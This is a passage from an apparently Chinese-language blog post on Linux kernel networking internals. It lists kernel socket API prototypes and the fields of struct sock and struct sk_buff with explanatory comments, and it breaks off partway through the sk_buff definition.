<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* socket create/delete */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_create</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol, struct socket **res)</span></span>; <span class="comment">/* 在系统调用socket()执行后创建一个socket结构体 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_create_kern</span><span class="params">(struct net *net, <span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol, struct socket **res)</span></span>; <span class="comment">/* 创建一个内核套接字 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_create_lite</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol, struct socket **res)</span></span>; <span class="comment">/* 创建不进行参数健全性检查的内核套接字 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sock_release</span><span class="params">(struct socket *sock)</span></span>; <span class="comment">/* 关闭socket并释放关联的资源 */</span></span><br></pre></td></tr></table></figure>
<p><code>struct sock</code>：</p>
<ul>
<li>在 Linux 术语中是套接字的网络表示形式，又称为 INET 套接字</li>
<li>该结构用于存储有关连接状态的信息</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now struct inet_timewait_sock also uses sock_common, so please just</span></span><br><span class="line"><span class="comment">	 * don&#x27;t add nothing before this first member (__sk_common) --acme</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_common</span>	__<span class="title">sk_common</span>;</span></span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">	<span class="keyword">socket_lock_t</span>		sk_lock;</span><br><span class="line">	<span class="keyword">atomic_t</span>		sk_drops;</span><br><span class="line">	<span class="keyword">int</span>			sk_rcvlowat;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span>	<span class="title">sk_error_queue</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span>	<span class="title">sk_receive_queue</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="keyword">atomic_t</span>	rmem_alloc;</span><br><span class="line">		<span class="keyword">int</span>		len;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>	*<span class="title">head</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>	*<span class="title">tail</span>;</span></span><br><span class="line">	&#125; sk_backlog;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sk_rmem_alloc sk_backlog.rmem_alloc</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span>			sk_forward_alloc;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET_RX_BUSY_POLL</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		sk_ll_usec;</span><br><span class="line">	<span class="comment">/* ===== mostly read cache line ===== */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		sk_napi_id;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span>			sk_rcvbuf;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_filter</span> __<span class="title">rcu</span>	*<span class="title">sk_filter</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">socket_wq</span> __<span class="title">rcu</span>	*<span class="title">sk_wq</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">socket_wq</span>	*<span class="title">sk_wq_raw</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_XFRM</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_policy</span> __<span class="title">rcu</span> *<span class="title">sk_policy</span>[2];</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dst_entry</span>	*<span class="title">sk_rx_dst</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dst_entry</span> __<span class="title">rcu</span>	*<span class="title">sk_dst_cache</span>;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>		sk_omem_alloc;</span><br><span class="line">	<span class="keyword">int</span>			sk_sndbuf;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ===== cache line for TX ===== */</span></span><br><span class="line">	<span class="keyword">int</span>			sk_wmem_queued;</span><br><span class="line">	<span class="keyword">refcount_t</span>		sk_wmem_alloc;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		sk_tsq_flags;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>	*<span class="title">sk_send_head</span>;</span> <span class="comment">/* 是用于数据传输的sk_buff列表 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span>	<span class="title">tcp_rtx_queue</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span>	<span class="title">sk_write_queue</span>;</span></span><br><span class="line">	__s32			sk_peek_off;</span><br><span class="line">	<span class="keyword">int</span>			sk_write_pending;</span><br><span class="line">	__u32			sk_dst_pending_confirm;</span><br><span class="line">	u32			sk_pacing_status; <span class="comment">/* see enum sk_pacing */</span></span><br><span class="line">	<span class="keyword">long</span>			sk_sndtimeo;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span>	<span class="title">sk_timer</span>;</span></span><br><span class="line">	__u32			sk_priority;</span><br><span class="line">	__u32			sk_mark;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		sk_pacing_rate; <span class="comment">/* bytes per second */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		sk_max_pacing_rate;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page_frag</span>	<span class="title">sk_frag</span>;</span></span><br><span class="line">	<span class="keyword">netdev_features_t</span>	sk_route_caps;</span><br><span class="line">	<span class="keyword">netdev_features_t</span>	sk_route_nocaps;</span><br><span class="line">	<span class="keyword">netdev_features_t</span>	sk_route_forced_caps;</span><br><span class="line">	<span class="keyword">int</span>			sk_gso_type;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		sk_gso_max_size;</span><br><span class="line">	<span class="keyword">gfp_t</span>			sk_allocation;</span><br><span class="line">	__u32			sk_txhash;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Because of non atomicity rules, all</span></span><br><span class="line"><span class="comment">	 * changes are protected by socket lock.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		__sk_flags_offset[<span class="number">0</span>];</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		sk_padding : <span class="number">1</span>,</span><br><span class="line">				sk_kern_sock : <span class="number">1</span>,</span><br><span class="line">				sk_no_check_tx : <span class="number">1</span>,</span><br><span class="line">				sk_no_check_rx : <span class="number">1</span>,</span><br><span class="line">				sk_userlocks : <span class="number">4</span>, </span><br><span class="line">				sk_protocol  : <span class="number">8</span>, <span class="comment">/* 套接字使用的协议类型 */</span></span><br><span class="line">				sk_type      : <span class="number">16</span>; <span class="comment">/* 套接字类型(SOCK_STREAM,SOCK_DGRAM等) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_PROTOCOL_MAX U8_MAX</span></span><br><span class="line">	u16			sk_gso_max_segs;</span><br><span class="line">	u8			sk_pacing_shift;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>	        sk_lingertime;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">proto</span>		*<span class="title">sk_prot_creator</span>;</span></span><br><span class="line">	<span class="keyword">rwlock_t</span>		sk_callback_lock;</span><br><span class="line">	<span class="keyword">int</span>			sk_err,</span><br><span class="line">				sk_err_soft;</span><br><span class="line">	u32			sk_ack_backlog;</span><br><span class="line">	u32			sk_max_ack_backlog;</span><br><span class="line">	<span class="keyword">kuid_t</span>			sk_uid;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span>		*<span class="title">sk_peer_pid</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">sk_peer_cred</span>;</span></span><br><span class="line">	<span class="keyword">long</span>			sk_rcvtimeo;</span><br><span class="line">	<span class="keyword">ktime_t</span>			sk_stamp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BITS_PER_LONG==32</span></span><br><span class="line">	<span class="keyword">seqlock_t</span>		sk_stamp_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	u16			sk_tsflags;</span><br><span class="line">	u8			sk_shutdown;</span><br><span class="line">	u32			sk_tskey;</span><br><span class="line">	<span class="keyword">atomic_t</span>		sk_zckey;</span><br><span class="line"></span><br><span class="line">	u8			sk_clockid;</span><br><span class="line">	u8			sk_txtime_deadline_mode : <span class="number">1</span>,</span><br><span class="line">				sk_txtime_report_errors : <span class="number">1</span>,</span><br><span class="line">				sk_txtime_unused : <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span>		*<span class="title">sk_socket</span>;</span> <span class="comment">/* 容纳它的BSD socket */</span></span><br><span class="line">	<span class="keyword">void</span>			*sk_user_data;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>			*sk_security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_cgroup_data</span>	<span class="title">sk_cgrp_data</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span>	*<span class="title">sk_memcg</span>;</span></span><br><span class="line">	<span class="keyword">void</span>			(*sk_state_change)(struct sock *sk);</span><br><span class="line">	<span class="keyword">void</span>			(*sk_data_ready)(struct sock *sk);</span><br><span class="line">	<span class="keyword">void</span>			(*sk_write_space)(struct sock *sk);</span><br><span class="line">	<span class="keyword">void</span>			(*sk_error_report)(struct sock *sk);</span><br><span class="line">	<span class="keyword">int</span>			(*sk_backlog_rcv)(struct sock *sk,</span><br><span class="line">						  struct sk_buff *skb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SOCK_VALIDATE_XMIT</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*		(*<span class="title">sk_validate_xmit_skb</span>)(<span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>,</span></span><br><span class="line"><span class="class">							<span class="keyword">struct</span> <span class="title">net_device</span> *<span class="title">dev</span>,</span></span><br><span class="line"><span class="class">							<span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">void</span>                    (*sk_destruct)(struct sock *sk);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_reuseport</span> __<span class="title">rcu</span>	*<span class="title">sk_reuseport_cb</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>		<span class="title">sk_rcu</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>相关 API 如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sending/receiving messages */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_recvmsg</span><span class="params">(struct socket *sock, struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>; <span class="comment">/* 从套接字socket(内核空间)接收消息 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg)</span></span>; <span class="comment">/* 利用套接字socket(内核空间)发送消息 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_recvmsg</span><span class="params">(struct socket *sock, struct msghdr *msg, struct kvec *vec, <span class="keyword">size_t</span> num, <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span>; <span class="comment">/* 从套接字socket(内核空间)接收消息 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg, struct kvec *vec, <span class="keyword">size_t</span> num, <span class="keyword">size_t</span> size)</span></span>; <span class="comment">/* 利用套接字socket(内核空间)发送消息 */</span></span><br></pre></td></tr></table></figure>
<p><code>struct sk_buff</code>：</p>
<ul>
<li>用于描述一个网络数据包及其状态</li>
<li>该结构是在用户空间或网络接口接收到内核数据包时创建的</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="comment">/* These two members must be first. */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>		*<span class="title">next</span>;</span> <span class="comment">/* 用于链接sk_buff的链表 */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>		*<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">net_device</span>	*<span class="title">dev</span>;</span> <span class="comment">/* 发送或接收缓冲区的网络设备 */</span></span><br><span class="line">				<span class="keyword">unsigned</span> <span class="keyword">long</span>		dev_scratch;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span>		<span class="title">rbnode</span>;</span> <span class="comment">/* used in netem, ip4 defrag, and tcp stack */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">list</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">sock</span>		*<span class="title">sk</span>;</span> <span class="comment">/* 与缓冲区关联的sock */</span></span><br><span class="line">		<span class="keyword">int</span>			ip_defrag_offset;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">ktime_t</span>		tstamp;</span><br><span class="line">		u64		skb_mstamp_ns; <span class="comment">/* earliest departure time */</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">char</span>			cb[<span class="number">48</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">long</span>	_skb_refdst;</span><br><span class="line">			<span class="keyword">void</span>		(*destructor)(struct sk_buff *skb);</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">tcp_tsorted_anchor</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_XFRM</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>	<span class="title">sec_path</span>	*<span class="title">sp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_NF_CONNTRACK) || defined(CONFIG_NF_CONNTRACK_MODULE)</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		 _nfct;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_ENABLED(CONFIG_BRIDGE_NETFILTER)</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nf_bridge_info</span>	*<span class="title">nf_bridge</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		len, data_len;</span><br><span class="line">	__u16			mac_len, hdr_len;</span><br><span class="line">	__u16			queue_mapping;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* if you move cloned around you also must adapt those constants */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __BIG_ENDIAN_BITFIELD</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLONED_MASK	(1 &lt;&lt; 7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLONED_MASK	1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLONED_OFFSET()		offsetof(struct sk_buff, __cloned_offset)</span></span><br><span class="line"></span><br><span class="line">	__u8			__cloned_offset[<span class="number">0</span>];</span><br><span class="line">	__u8			cloned:<span class="number">1</span>,</span><br><span class="line">                    nohdr:<span class="number">1</span>,</span><br><span class="line">                    fclone:<span class="number">2</span>,</span><br><span class="line">                    peeked:<span class="number">1</span>,</span><br><span class="line">                    head_frag:<span class="number">1</span>,</span><br><span class="line">                    xmit_more:<span class="number">1</span>,</span><br><span class="line">                    pfmemalloc:<span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* private: */</span></span><br><span class="line">	__u32			headers_start[<span class="number">0</span>];</span><br><span class="line">	<span class="comment">/* public: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* if you move pkt_type around you also must adapt those constants */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __BIG_ENDIAN_BITFIELD</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PKT_TYPE_MAX	(7 &lt;&lt; 5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PKT_TYPE_MAX	7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PKT_TYPE_OFFSET()	offsetof(struct sk_buff, __pkt_type_offset)</span></span><br><span class="line"></span><br><span class="line">	__u8			__pkt_type_offset[<span class="number">0</span>];</span><br><span class="line">	__u8			pkt_type:<span class="number">3</span>;</span><br><span class="line">	__u8			ignore_df:<span class="number">1</span>;</span><br><span class="line">	__u8			nf_trace:<span class="number">1</span>;</span><br><span class="line">	__u8			ip_summed:<span class="number">2</span>;</span><br><span class="line">	__u8			ooo_okay:<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	__u8			l4_hash:<span class="number">1</span>;</span><br><span class="line">	__u8			sw_hash:<span class="number">1</span>;</span><br><span class="line">	__u8			wifi_acked_valid:<span class="number">1</span>;</span><br><span class="line">	__u8			wifi_acked:<span class="number">1</span>;</span><br><span class="line">	__u8			no_fcs:<span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* Indicates the inner headers are valid in the skbuff. */</span></span><br><span class="line">	__u8			encapsulation:<span class="number">1</span>;</span><br><span class="line">	__u8			encap_hdr_csum:<span class="number">1</span>;</span><br><span class="line">	__u8			csum_valid:<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	__u8			csum_complete_sw:<span class="number">1</span>;</span><br><span class="line">	__u8			csum_level:<span class="number">2</span>;</span><br><span class="line">	__u8			csum_not_inet:<span class="number">1</span>;</span><br><span class="line">	__u8			dst_pending_confirm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_IPV6_NDISC_NODETYPE</span></span><br><span class="line">	__u8			ndisc_nodetype:<span class="number">2</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	__u8			ipvs_property:<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	__u8			inner_protocol_type:<span class="number">1</span>;</span><br><span class="line">	__u8			remcsum_offload:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET_SWITCHDEV</span></span><br><span class="line">	__u8			offload_fwd_mark:<span class="number">1</span>;</span><br><span class="line">	__u8			offload_mr_fwd_mark:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET_CLS_ACT</span></span><br><span class="line">	__u8			tc_skip_classify:<span class="number">1</span>;</span><br><span class="line">	__u8			tc_at_ingress:<span class="number">1</span>;</span><br><span class="line">	__u8			tc_redirected:<span class="number">1</span>;</span><br><span class="line">	__u8			tc_from_ingress:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TLS_DEVICE</span></span><br><span class="line">	__u8			decrypted:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET_SCHED</span></span><br><span class="line">	__u16			tc_index;	<span class="comment">/* traffic control index */</span></span><br><span class="line"><span class="meta">#<span 